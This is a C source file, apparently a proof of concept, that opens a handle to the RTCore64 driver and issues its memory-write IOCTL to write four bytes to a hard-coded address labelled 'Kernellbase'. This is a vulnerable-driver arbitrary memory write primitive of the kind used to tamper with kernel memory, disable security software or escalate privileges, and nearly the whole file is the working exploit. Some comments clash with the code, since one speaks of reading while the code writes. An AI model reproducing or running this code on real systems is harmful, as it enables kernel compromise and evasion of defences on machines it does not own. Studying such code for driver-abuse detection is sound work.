#include "helpers.h"

// Define IOCTL codes
#define RTCORE64_MEMORY_WRITE_CODE 0x8000204C

struct RTCORE64_MEMORY_WRITE {
	BYTE		Pad0[8];
	DWORD64		Address;
	BYTE		Pad1[8];
	DWORD		WriteSize;
	DWORD		Value;
	BYTE		Pad3[16];
};

int main() {

	HANDLE 	hDevice			= NULL; // Handle to device
	DWORD 	dwBytesReturned	= NULL;	// Number of bytes read
	BOOL	bSuccess		= NULL; // Bool to store FALSE/TRUE

	// Open a file handle to the driver using its symbolic link
	// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
	hDevice = CreateFileW(
		L"\\\\.\\RTCore64",			// Symbolic link to RTCore64 driver
		GENERIC_WRITE,				// Write access
		0,							// No sharing
		NULL,						// Default security attributes
		OPEN_EXISTING,				// Open the existing device
		FILE_ATTRIBUTE_NORMAL,		// Normal file attributes
		NULL						// No template file
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		errorWin32("CreateFile - Failed to open the device");
		return EXIT_FAILURE;
	}
	okay("CreateFileW - Opened file handle to RTCore64 at 0x%p", hDevice);

	// Initialize struct and set memory to read
	struct RTCORE64_MEMORY_WRITE memoryWrite = { 0 };
	memoryWrite.Address = 0x7ffb36b40000;		// Target address Kernellbase
	memoryWrite.Value = 0x00905a4d;				// Value to write
	memoryWrite.WriteSize = 4;					// Writing 4 bytes

	// Sends control code directly to specified device driver
	// https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol
	bSuccess = DeviceIoControl(
		hDevice,					// Handle to the device
		RTCORE64_MEMORY_WRITE_CODE,	// IOCTL Code that specifies the operation
		&memoryWrite,				// Pointer to input data
		sizeof(memoryWrite),		// Size of data
		NULL,						// No output buffer
		0,							// No size of the output buffer
		&dwBytesReturned,			// Number of bytes returned
		NULL						// Overlapped structure
	);
	if (!bSuccess) {
		errorWin32("DeviceIoControl - Failed to open the device and write memory");
		if (hDevice) {
			CloseHandle(hDevice);
			info("CloseHandle - Closed handle to device");
		}
		return EXIT_FAILURE;
	}
	okay("DeviceIoControl - Written memory");

	// Close file handle
	if (hDevice) {
		CloseHandle(hDevice);
		info("CloseHandle - Closed handle to device");
	}

	return EXIT_SUCCESS;
}